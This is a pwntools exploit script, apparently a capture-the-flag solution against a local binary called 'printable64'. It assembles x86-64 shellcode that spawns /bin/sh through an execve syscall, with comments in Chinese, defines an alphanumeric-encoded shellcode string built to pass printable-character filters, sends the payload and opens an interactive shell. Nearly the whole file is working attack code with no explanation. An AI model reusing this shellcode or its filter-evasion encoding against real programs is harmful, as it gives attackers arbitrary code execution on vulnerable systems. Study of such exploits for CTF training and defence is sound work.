from pwn import *
context(arch = 'amd64', os = 'linux')

io = process("./printable64")

def debug():
	gdb.attach(io)
	pause()


shellcode = '''
        /* 设置 rdi -> /bin///sh */
	push r13
	push 0x68
        push 0x732f2f2f
        push 0x6e69622f
	push rbp
	pop rdi
	/* 构造 syscall */
        push 0x40
        pop rdx
        sub byte ptr[rax+0x21], dl
        sub byte ptr[rax+0x22], dl

        /* 设置 rsi = 0, rdx = 0 */
        push rbx
        pop rsi
        push rbx
        pop rdx
        push rbx
        pop rax
        xor al, 0x3B
        push rdx
        pop rdx
'''

shellcode = asm(shellcode) + b'\x4F\x45'
print(hex(len(shellcode) - 2))
print(shellcode)

shellcode0 = b'PPTAYAXVI31'
shellcode0 += b'VXXXf-cof-@Hf-@HPZTAYAXVI31VXPP[_Hc4:14:SX-@(t3-P `_58</_P^14:WX-~[w_-?ah,-?C tP_Hc4:14:SX-q;@A-pE A5Wp09P^14:WX-~[w_-?ah,-?C tP_Hc4:14:SX-$Ht -_`l 5O_W6P^14:WX-~[w_-?ah,-?C tP_Hc4:14:SX-@"3@-A`  5{G/XP^14:WX-~[w_-?ah,-?C tP_Hc4:14:SX-@&Fa-P" A5x4_MP^14:WX-~[w_-?ah,-?C tP_Hc4:14:SX-  " - @~@5E_*wP^14:WX-~[w_-?ah,-?C tP_SX- H#B- x^~5X>~?P_Hc4:14:SX-"*  -E6  5f}//P^14:WX-~[w_-?ah,-?C tP_SX- A""- ?~~5\~__P^SX-@@@"-y``~5____P_AAAAA5SWZ%%.H>#dmn+sATbRLad:hFTHKcL5Acy\\4:y1vI6: O:;<;wb[\'2 @p}Y;\\tc'
debug()
io.sendline(shellcode)

io.interactive()
